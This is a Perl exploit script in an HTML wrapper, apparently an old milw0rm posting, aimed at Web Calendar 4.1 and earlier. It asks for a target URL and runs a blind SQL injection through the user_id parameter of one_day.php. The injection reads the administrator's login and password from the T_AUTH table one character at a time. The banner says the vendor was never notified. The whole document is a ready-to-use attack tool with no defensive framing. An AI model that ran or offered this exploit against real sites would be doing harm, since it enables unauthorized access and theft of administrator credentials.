<html><head><title>Web Calendar <= 4.1 Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

use strict;
use LWP::Simple;

print &quot;-+--[ Web Calendar &lt;= 4.1 Blind SQL Injection Exploit ]--+-\n&quot;;
print &quot;-+--                                                   --+-\n&quot;;
print &quot;-+--           Discovered &amp;&amp; Coded By t0pP8uZz         --+-\n&quot;;
print &quot;-+--             Discovered On: 24 April 2008          --+-\n&quot;;
print &quot;-+--                                                   --+-\n&quot;;
print &quot;-+-- Web Calendar suffers from a insecure mysql query  --+-\n&quot;;
print &quot;-+--  the vendor has not been notified.. and wont be.. --+-\n&quot;;
print &quot;-+--                                                   --+-\n&quot;;
print &quot;-+--          Exploit tested in ActivePerl             --+-\n&quot;;
print &quot;-+--                                                   --+-\n&quot;;
print &quot;-+--[ Web Calendar &lt;= 4.1 Blind SQL Injection Exploit ]--+-\n&quot;;

print &quot;\nEnter URL (ie: http://site.com/webcal/): &quot;;
	chomp(my $url=&lt;STDIN&gt;);
	
print &quot;\n\nInjecting Please Wait..\n\n&quot;
	
my $lop = 1;
my $num = 48;
my $sub = 1;
my $res = undef;
my $content = undef;

while($lop) {

	$content = get($url.&quot;/one_day.php?user_id=1 AND ASCII(SUBSTRING((SELECT CONCAT(login,char(58),password,char(94)) FROM T_AUTH WHERE role_id=1 LIMIT 0,1),&quot;.$sub.&quot;,1))=&quot;.$num.&quot;/*&quot;);
	
	if($content !~ /you are not in database/i &amp;&amp; $num == 94) { $lop = 0; }
	elsif($content !~ /you are not in database/i) { $res .= chr($num); $num = 48; $sub++; print $res.&quot;\n&quot;; }
	else { $num++; }
}

print &quot;\nExploit Successfull! Admin Details Are: &quot;.$res;

# Coded by t0pP8uZz

# milw0rm.com [2008-04-22]</pre></html>